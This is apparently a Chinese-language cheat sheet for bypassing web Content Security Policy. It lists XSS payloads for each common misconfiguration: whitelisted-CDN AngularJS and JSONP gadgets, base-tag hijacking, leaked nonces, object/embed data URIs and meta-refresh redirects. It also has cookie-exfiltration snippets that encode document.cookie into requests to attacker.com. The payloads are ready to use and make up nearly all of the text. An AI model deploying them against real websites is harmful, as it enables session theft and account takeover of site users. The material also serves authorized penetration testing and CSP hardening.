# CSP 绕过参考手册

## CSP 检测

```bash
# 检查 CSP 头
curl -sI "http://target.com" | grep -i "content-security-policy"

# 分析 CSP 策略
# 在线工具: https://csp-evaluator.withgoogle.com/
```

## 常见 CSP 配置与绕过

### unsafe-inline 存在时

CSP 允许内联脚本，直接注入即可：

```html
<script>alert(1)</script>
```

### 利用白名单域名

当 CSP 白名单包含 CDN 或 JSONP 端点时：

```html
<!-- 利用 AngularJS (如果 CDN 在白名单中) -->
<script src="https://allowed-cdn.com/angular.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>

<!-- 利用 JSONP 端点 -->
<script src="https://allowed-cdn.com/jsonp?callback=alert(1)//"></script>

<!-- 利用白名单域上的重定向 -->
<script src="https://allowed-domain.com/redirect?url=http://attacker.com/evil.js"></script>
```

### base 标签劫持

当 CSP 未设置 `base-uri` 指令时：

```html
<base href="http://attacker.com/">
<!-- 页面后续的相对路径 script src 将从 attacker.com 加载 -->
```

### 利用 nonce 泄露

如果 nonce 值可被预测或在页面中泄露：

```html
<script nonce="leaked-nonce">alert(1)</script>
```

### DNS 预取数据外泄

当 CSP 限制严格但未禁止 DNS 预取时：

```html
<link rel="dns-prefetch" href="//data.attacker.com">
<link rel="prefetch" href="//attacker.com">

<!-- 动态外泄 -->
<script nonce="valid">
var x = document.cookie;
var img = new Image();
img.src = "//"+btoa(x)+".attacker.com";
</script>
```

### 利用 object/embed 标签

当 CSP 未限制 `object-src` 时：

```html
<object data="data:text/html,<script>alert(1)</script>">
<embed src="data:text/html,<script>alert(1)</script>">
```

### 利用 meta 标签跳转

当 CSP 未限制 `navigate-to` 时：

```html
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
<meta http-equiv="refresh" content="0;url=http://attacker.com/steal?c=cookie">
```

## CSP 绕过检查清单

1. 检查是否存在 `unsafe-inline` 或 `unsafe-eval`
2. 分析白名单域名是否有 JSONP/重定向端点
3. 检查 `base-uri` 是否被限制
4. 检查 `object-src` 是否被限制
5. 检查 nonce 是否可预测或泄露
6. 检查是否有 `strict-dynamic` 可利用
7. 尝试 DNS 预取外泄绕过数据传输限制
